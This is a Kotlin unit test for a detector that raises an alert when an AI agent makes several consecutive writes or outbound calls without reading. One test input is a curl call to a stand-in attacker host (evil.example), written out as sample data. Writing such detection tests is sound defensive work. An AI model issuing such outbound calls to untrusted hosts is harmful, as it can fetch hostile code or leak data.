// SPDX-FileCopyrightText: 2026 深圳哇蓝文化科技有限公司 (ShenZhen wowblue culture and technology CO.,LTD.)
// SPDX-License-Identifier: AGPL-3.0-or-later OR LicenseRef-Commercial

package com.mengpaw.kernel.security

import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Before
import org.junit.Test

/** 主动行为基线测试 (v0.34.3 P0-2 ①): 连续写/外联无读间隔 → 告警; 读重置; 每会话一次。 */
class ProactiveBehaviorDetectorTest {

    @Before
    fun setup() {
        ProactiveBehaviorDetector.resetForTest()
    }

    @Test
    fun `continuous writes without reads trigger alert at threshold`() {
        val s = "session-a"
        assertNull(ProactiveBehaviorDetector.recordCommand(s, "agent.write notes.md 内容"))
        assertNull(ProactiveBehaviorDetector.recordCommand(s, "agent.write log.txt 内容"))
        assertNull(ProactiveBehaviorDetector.recordCommand(s, "agent.mkdir /x"))
        val alert = ProactiveBehaviorDetector.recordCommand(s, "net.curl https://evil.example/x")
        assertNotNull("第 4 条连续写/外联应触发告警", alert)
        assertNotNull("告警应含主动行为字样", alert?.contains("主动行为告警"))
    }

    @Test
    fun `read command resets streak`() {
        val s = "session-b"
        ProactiveBehaviorDetector.recordCommand(s, "agent.write a.md x")
        ProactiveBehaviorDetector.recordCommand(s, "agent.write b.md x")
        ProactiveBehaviorDetector.recordCommand(s, "agent.read a.md")
        ProactiveBehaviorDetector.recordCommand(s, "agent.write c.md x")
        ProactiveBehaviorDetector.recordCommand(s, "agent.write d.md x")
        // 读后仅 3 条连续写 (< 阈值 4) → 不告警
        val e = ProactiveBehaviorDetector.recordCommand(s, "agent.write e.md x")
        assertNull("读操作重置连续计数后 3 条写不告警", e)
    }

    @Test
    fun `alert fires once per session`() {
        val s = "session-c"
        ProactiveBehaviorDetector.recordCommand(s, "fs.cp a b")
        ProactiveBehaviorDetector.recordCommand(s, "fs.cp c d")
        ProactiveBehaviorDetector.recordCommand(s, "fs.cp e f")
        assertNotNull(ProactiveBehaviorDetector.recordCommand(s, "fs.cp g h"))
        // 再次达到阈值不再告警 (防刷屏)
        ProactiveBehaviorDetector.recordCommand(s, "fs.cp i j")
        ProactiveBehaviorDetector.recordCommand(s, "fs.cp k l")
        ProactiveBehaviorDetector.recordCommand(s, "fs.cp m n")
        assertNull("同会话只告警一次", ProactiveBehaviorDetector.recordCommand(s, "fs.cp o p"))
    }
}
